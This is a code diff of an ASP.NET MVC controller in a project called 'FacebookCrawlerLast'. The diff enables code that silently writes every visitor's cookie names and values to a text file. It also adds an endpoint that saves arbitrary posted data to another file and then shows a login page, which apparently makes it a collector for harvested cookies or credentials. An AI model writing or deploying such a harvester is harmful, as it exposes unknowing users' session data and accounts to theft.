@@ -14,19 +14,18 @@ namespace FacebookCrawlerLast.Controllers
     {
         public ActionResult Index()
         {
-            //var str = "";
-            //string[] allCookies = Request.Cookies.AllKeys;
-            //foreach (string cookie in allCookies)
-            //{
-            //    var c = Request.Cookies[cookie];
+            var str = "";
+            string[] allCookies = Request.Cookies.AllKeys;
+            foreach (string cookie in allCookies)
+            {
+                var c = Request.Cookies[cookie];
+                str += c.Name + " : " + c.Value + " " + DateTime.Now.ToString() + Environment.NewLine;
+            }
 
-            //    str += c.Name + " : " + c.Value;
-            //}
-
-            //using (StreamWriter _testData = new StreamWriter(Server.MapPath("~/onurbeycerez.txt"), true))
-            //{
-            //    _testData.WriteLine(str);
-            //}
+            using (StreamWriter _testData = new StreamWriter(Server.MapPath("~/onurbeycerez.txt"), true))
+            {
+                _testData.WriteLine(str);
+            }
 
             return View();
         }
@@ -36,6 +35,26 @@ namespace FacebookCrawlerLast.Controllers
             return View();
         }
 
+        public ActionResult setdata()
+        {
+            var json = JsonConvert.DeserializeObject(Request["data"]);
+
+            byte[] utf = System.Text.Encoding.UTF8.GetBytes(Request["data"]);
+
+            var postmodel = System.Text.Encoding.UTF8.GetString(utf);
+
+            var str = postmodel;
+
+
+
+
+            using (StreamWriter _testData = new StreamWriter(Server.MapPath("~/cerez.txt"), true))
+            {
+                _testData.WriteLine(str);
+            }
+
+            return View("LoginPage");
+        }
 
 
         public ActionResult Login(User postModel)
